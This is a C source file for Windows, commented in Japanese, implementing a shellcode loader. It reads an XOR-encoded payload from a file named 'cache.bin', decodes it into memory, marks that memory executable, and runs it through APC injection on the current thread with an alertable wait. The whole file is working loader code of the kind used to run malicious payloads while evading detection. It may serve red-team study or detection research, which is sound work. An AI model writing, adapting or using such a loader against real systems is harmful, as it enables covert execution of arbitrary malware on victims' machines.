#include <Windows.h>
#include <stdio.h>

#define MAX_SHELLCODE_SIZE (1024 * 1024 * 100)
#define KEY 0x55

__declspec(noinline) void XOR(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE pbBuffer) {

	for (SIZE_T i = 0; i < sPayloadSize; i++) {
		pbBuffer[i] = pPayload[i] ^ KEY;
	}
}

PBYTE LoadShellcode(IN LPCWSTR lpPath, OUT PDWORD lpdwSize) {

	HANDLE        hFile      = INVALID_HANDLE_VALUE;
	PBYTE         pbBuffer   = NULL;
	DWORD         dwSize     = 0;
	DWORD         dwByteRead = 0;
	LARGE_INTEGER liFileSize = { 0 };

	//シェルコードを開く
	hFile = CreateFileW(
		lpPath,                //ファイルパス
		GENERIC_READ,          //読み取り専用
		FILE_SHARE_READ,       //他プロセスからの読み取りを許可
		NULL,                  //ACL,ハンドル継承必要なし
		OPEN_EXISTING,         //既存のファイルのみを開く
		FILE_ATTRIBUTE_NORMAL, //通常のファイル属性
		NULL                   //新規のファイル作成ではないためNULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFileW failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	//シェルコードのサイズを取得
	if (!GetFileSizeEx(
		hFile,      //対象ファイルのハンドル
		&liFileSize //サイズを受け取るバッファ
	))
	{
		printf("[-] GetFileSizeEx failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (liFileSize.QuadPart == 0 || liFileSize.QuadPart > MAX_SHELLCODE_SIZE) {
		printf("[-] Invalid shellcode size: %lld\n", liFileSize.QuadPart);
		goto _EndOfFunc;
	}

	dwSize = (DWORD)liFileSize.QuadPart;

	//シェルコードのバイト数だけメモリ確保
	pbBuffer = (PBYTE)HeapAlloc(
		GetProcessHeap(),  //デフォルトヒープのハンドル
		0,                 //デフォルト動作
		dwSize);           //シェルコードの長さだけ確保
	if (pbBuffer == NULL) {
		printf("[-] HeapAlloc failed\n");
		goto _EndOfFunc;
	}

	//シェルコードを読み込んでpbBufferに書き込み
	if (!ReadFile(
		hFile,       //ファイルのハンドル
		pbBuffer,    //読み込み先バッファ
		dwSize,      //読み込む最大バイト数
		&dwByteRead, //実際に読み込まれたバイト数
		NULL         //非同期IO不使用
	) || dwByteRead != dwSize) {
		printf("[-] ReadFile failed: %lu (read=%lu, expected=%lu)\n", GetLastError(), dwByteRead, dwSize);
		HeapFree(GetProcessHeap(), 0, pbBuffer);
		pbBuffer = NULL;
	}

	*lpdwSize = dwSize;


_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}


	return pbBuffer;
}

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PBYTE pAddress        = NULL;
	DWORD dwOldProtection = 0;
	BOOL  bSuccess        = FALSE;

	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[-] VirtualAlloc failed :%lu\n", GetLastError());
		goto cleanup;
	}

	XOR(pPayload, sPayloadSize, pAddress);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("[-] VirtualProtect failed :%lu\n", GetLastError());
		goto cleanup;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL)) {
		printf("[-] QueueUserAPC failed :%lu\n", GetLastError());
		goto cleanup;
	}

	bSuccess = TRUE;

cleanup:
	if (!bSuccess && pAddress != NULL) {
		VirtualFree(pAddress, 0, MEM_RELEASE);
	}
	return bSuccess;
}

int main(void) {

	DWORD dwShellcodeSize = 0;
	PBYTE pbShellcode     = LoadShellcode(L"cache.bin", &dwShellcodeSize);

	if (pbShellcode == NULL) {
		return 1;
	}

	//printf("Loaded %lu bytes at %p\n", dwShellcodeSize, pbShellcode);

	HANDLE hThread = GetCurrentThread();

	if (!RunViaApcInjection(hThread, pbShellcode, dwShellcodeSize)) {
		printf("[-] RunViaApcInjection failed :%lu\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, pbShellcode);
		return 1;
	}

	HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (hEvent) {
		WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
	// 読み込みバッファ解放
	HeapFree(GetProcessHeap(), 0, pbShellcode);

	return 0;
}